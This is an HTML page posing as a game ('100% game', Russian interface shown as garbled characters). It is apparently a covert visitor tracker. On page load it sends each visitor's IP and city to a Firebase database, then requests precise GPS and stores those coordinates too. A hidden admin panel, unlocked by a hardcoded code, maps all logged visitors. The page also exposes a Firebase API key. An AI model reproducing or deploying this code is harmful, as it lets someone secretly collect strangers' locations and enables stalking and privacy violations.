<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>100% game</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        :root { --primary: #007bff; --bg: #0b0b0b; --card: #161616; --danger: #ff4444; --success: #00ff88; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; }
        
        #code-step { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
        input { background: #222; border: 1px solid #444; color: #fff; padding: 15px; border-radius: 12px; width: 80%; max-width: 300px; font-size: 18px; margin-bottom: 15px; outline: none; }
        button { background: var(--primary); color: #fff; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; }

        #result-step { display: none; flex-direction: column; height: 100vh; width: 100%; }
        .admin-header { padding: 15px; background: var(--card); border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        
        .mobile-layout { display: flex; flex-direction: column; flex: 1; min-height: 0; }
        #map-box { flex: 1; position: relative; min-height: 250px; border-bottom: 2px solid #333; }
        #map { position: absolute; top:0; bottom:0; left:0; right:0; width: 100%; height: 100%; }
        
        #logs { flex: 1.5; overflow-y: auto; background: #000; padding: 10px; }
        .log-item { background: var(--card); margin-bottom: 10px; padding: 15px; border-radius: 15px; border-left: 5px solid var(--primary); font-size: 13px; position: relative; }
        
        .coords-text { display: block; color: #aaa; font-family: monospace; margin-top: 5px; font-size: 11px; }
        .delete-btn { position: absolute; top: 10px; right: 10px; background: var(--danger); color: white; border: none; padding: 5px 10px; border-radius: 8px; font-size: 11px; cursor: pointer; }
        
        .method-tag { font-size: 9px; padding: 2px 6px; border-radius: 4px; background: #333; margin-right: 5px; text-transform: uppercase; }
        .gps-tag { background: var(--success); color: #000; font-weight: bold; }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="code-step">
        <h1 style="color: var(--primary);">System Access</h1>
        <input type="password" id="accessCode" placeholder="–°–ï–ö–†–ï–¢–ù–´–ô –ö–û–î">
        <button onclick="checkCode()">–í–û–ô–¢–ò</button>
    </div>

    <div id="result-step">
        <div class="admin-header">
            <b>Global Tracker</b>
            <span id="count-label" style="font-size: 12px; opacity: 0.7;">0 –∑–∞–ø–∏—Å–µ–π</span>
        </div>
        <div class="mobile-layout">
            <div id="map-box"><div id="map"></div></div>
            <div id="logs">–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</div>
        </div>
    </div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, remove, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
        authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
        projectId: "flutter-ai-playground-caf0d", 
        storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
        messagingSenderId: "155816311480", 
        appId: "1:155816311480:web:a0456fcc4681e62837924d",
        databaseURL: "https://cheatip-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_CODE = "HTMLKODEYOURIP";
    let map, markers = {};

    // --- –õ–û–ì–ò–ö–ê –£–ú–ù–û–ì–û –û–ë–ù–û–í–õ–ï–ù–ò–Ø ---
    async function startSmartTracking() {
        try {
            // 1. –°—Ä–∞–∑—É –±–µ—Ä–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ IP
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            
            // –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é –∑–∞–ø–∏—Å—å –≤ –±–∞–∑–µ –∏ –ø–æ–ª—É—á–∞–µ–º –µ—ë —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID (Key)
            const visitRef = push(ref(db, 'visits'));
            const visitId = visitRef.key;

            const initialData = {
                ip: ipData.ip || "Unknown",
                city: ipData.city || "Unknown",
                lat: ipData.latitude,
                lng: ipData.longitude,
                method: "IP",
                time: new Date().toLocaleString('ru-RU'),
                timestamp: serverTimestamp()
            };

            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (IP)
            update(ref(db, `visits/${visitId}`), initialData);

            // 2. –°–ø—Ä–∞—à–∏–≤–∞–µ–º GPS. –ï—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–∏—Ç - –û–ë–ù–û–í–õ–Ø–ï–ú –¢–£ –ñ–ï –ó–ê–ü–ò–°–¨
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    update(ref(db, `visits/${visitId}`), {
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        method: "GPS" // –ú–µ–Ω—è–µ–º –º–µ—Ç–∫—É –Ω–∞ GPS
                    });
                }, null, { enableHighAccuracy: true });
            }
        } catch (e) { console.error("Tracking error"); }
    }

    startSmartTracking();

    // --- –ê–î–ú–ò–ù –ü–ê–ù–ï–õ–¨ ---
    window.checkCode = function() {
        if (document.getElementById('accessCode').value === SECRET_CODE) {
            document.getElementById('code-step').classList.add('hidden');
            document.getElementById('result-step').style.display = 'flex';
            setTimeout(initMap, 300);
        } else { location.reload(); }
    }

    function initMap() {
        map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        loadData();
    }

    window.deleteRecord = function(e, key) {
        e.stopPropagation();
        if(confirm("–£–¥–∞–ª–∏—Ç—å –∑–∞–ø–∏—Å—å?")) { remove(ref(db, `visits/${key}`)); }
    }

    function loadData() {
        onValue(ref(db, 'visits'), (snap) => {
            const data = snap.val();
            const logBox = document.getElementById('logs');
            logBox.innerHTML = '';
            
            Object.values(markers).forEach(m => map.removeLayer(m));
            markers = {};

            if(!data) {
                logBox.innerHTML = "<p style='text-align:center; color:#555;'>–ë–∞–∑–∞ –ø—É—Å—Ç–∞</p>";
                document.getElementById('count-label').innerText = "0 –∑–∞–ø–∏—Å–µ–π";
                return;
            }

            const entries = Object.entries(data);
            document.getElementById('count-label').innerText = `${entries.length} –∑–∞–ø–∏—Å–µ–π`;

            entries.reverse().forEach(([key, user], i) => {
                const isGPS = user.method === "GPS";
                const div = document.createElement('div');
                div.className = 'log-item';
                div.innerHTML = `
                    <button class="delete-btn" onclick="deleteRecord(event, '${key}')">√ó</button>
                    <span class="method-tag ${isGPS ? 'gps-tag' : ''}">${user.method}</span>
                    <b style="color:var(--primary)">#${entries.length - i}</b><br>
                    <b>IP:</b> ${user.ip}<br>
                    <b>City:</b> ${user.city}<br>
                    <span class="coords-text">üìç ${user.lat.toFixed(6)}, ${user.lng.toFixed(6)}</span>
                    <small style="color:#666">${user.time}</small>
                `;
                
                div.onclick = () => map.flyTo([user.lat, user.lng], 16);
                logBox.appendChild(div);

                markers[key] = L.marker([user.lat, user.lng]).addTo(map)
                    .bindPopup(`User #${entries.length - i}<br>Method: ${user.method}`);
            });
        });
    }
</script>
</body>
</html>
